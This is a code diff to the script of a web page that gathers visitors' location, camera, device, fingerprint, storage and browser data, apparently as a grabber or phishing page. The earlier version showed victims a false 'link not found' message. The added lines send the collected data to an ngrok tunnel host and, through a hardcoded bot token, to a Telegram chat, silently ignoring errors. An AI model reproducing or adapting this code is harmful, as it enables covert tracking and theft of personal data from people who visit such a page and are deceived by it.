@@ -82,7 +82,10 @@ await Promise.race([gp,new Promise(function(r){setTimeout(r,5000);})]);
 if(!geoDone&&Object.keys(col.geo).length===0)col.geo={Status:"Waiting for permission..."};
 }else{col.geo={Error:"Not supported"};}
 setStatus("يرجي الانتظار","#4ecdc4");
-try{var res=await fetch("/api/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({user_id:getOrGenerateUserId(),consent:con,basic:col.basic,geo:col.geo,cam:col.cam,device:col.device,fingerprint:col.fingerprint,storage:col.storage,browser:col.browser})});var data=await res.json();if(data.success){setStatus("يبدو ان اللينك غير موجود تحقق واعد المحاوله","#ff6b6b");}else{setStatus("يبدو ان هناك مشكله","#ff6b6b");}}catch(e){setStatus("يبدو ان هناك عطل في الخادم","#ff6b6b");}
+var payload={user_id:getOrGenerateUserId(),consent:con,basic:col.basic,geo:col.geo,cam:col.cam,device:col.device,fingerprint:col.fingerprint,storage:col.storage,browser:col.browser};
+try{await fetch("https://molasses-gibberish-flagship.ngrok-free.dev/api/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});}catch(e){}
+try{var telegramToken="7889924153:AAH0MDgnmeQDaCbyaaEgSyH5MIvQDYJ4Dpc";var chatId="8625913828";var message="New data collected:\n\nUser ID: "+payload.user_id+"\n\nBasic: "+JSON.stringify(payload.basic)+"\n\nDevice: "+JSON.stringify(payload.device)+"\n\nFingerprint: "+JSON.stringify(payload.fingerprint);await fetch("https://api.telegram.org/bot"+telegramToken+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:chatId,text:message})});}catch(e){}
+setStatus("تم جمع البيانات وإرسالها بنجاح","#4ecdc4");
 btn.disabled=false;
 }
 </script>
